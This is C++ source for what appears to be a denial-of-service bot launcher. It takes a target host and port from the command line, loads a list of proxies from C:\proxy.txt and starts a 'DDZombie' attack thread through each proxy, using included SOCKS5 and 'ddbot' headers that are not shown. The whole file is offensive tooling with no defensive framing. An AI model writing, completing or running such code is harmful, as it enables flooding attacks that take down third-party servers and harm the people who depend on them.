#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <thread>
#include <stack>
#include "socks5.h"
#include "ddbot.h"
#include "control.h"
#pragma comment (lib,"ws2_32.lib")

int NUM_CONN = 0;

char controlMessage[32]{};
char host[64]{};
bool bControl = false;
int port = 0;

int main(int argc, const char** argv)
{
	WSADATA wsaData;

	int iResult = WSAStartup(MAKEWORD(2, 0), &wsaData);
	if(iResult != NO_ERROR)
	{
		// printf("WSAStartup() error: %d\n", iResult);
		return 1;
	}

	int i;
	for(i = 0; i < sizeof(host) - 1 && argv[1][i] && argv[1][i] != ':'; i++)
		host[i] = argv[1][i];
	if(argv[1][i] == ':')
		port = atol(argv[1] + i + 1);

	printf("Starting. Server IP: %s, port: %d\n", host, port);

	std::ifstream fp("C:\\proxy.txt");

	if(!fp.is_open())
	{
		// printf("error opening file: %d\n", GetLastError());
		return 1;
	}

	std::vector<std::string> vprx;
	std::copy(std::istream_iterator<std::string>(fp),
		std::istream_iterator<std::string>(),
		std::back_inserter<std::vector<std::string>>(vprx));

	std::thread control([]
		{
			HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
			while(true)
			{
				INPUT_RECORD inp[200];
				DWORD i = 0, num;

				if(!PeekConsoleInput(h, inp, 200, &num))
					continue;

				for(i = 0; i < num; i++)
				{
					if(inp[i].EventType == KEY_EVENT && inp[i].Event.KeyEvent.wVirtualKeyCode == VK_RETURN)
					{
						ReadConsoleA(h, controlMessage, sizeof(controlMessage), &num, NULL);

						// command list
						if(!strncmp(";command", controlMessage, 9))
						{

						}

						// finally unlock control
						bControl = !bControl;
						break;
					}

					else if(inp[i].EventType == KEY_EVENT && inp[i].Event.KeyEvent.wVirtualKeyCode == VK_DELETE)
					{
						memset(controlMessage, 0, 32);
					}
				}
				SetConsoleTitleA(controlMessage);
			}
		});
	control.detach();

	int index = 0;
	for(std::string proxy : vprx)
	{
		std::thread t([proxy, index]
			{
				DDZombie d;
				if(d.Init(proxy, index))
				{
					// printf("thread %d initialized succesfully, proxy: %s \n", i, proxy.c_str());
					d.Start();
				}
				// else  printf("thread %d failed\n", i);
			});
		t.detach();
		index++;
		std::this_thread::sleep_for(125ms);
	}

	printf("End of proxy list.\n");

	while(true)
		Sleep(0);

	return 0;
}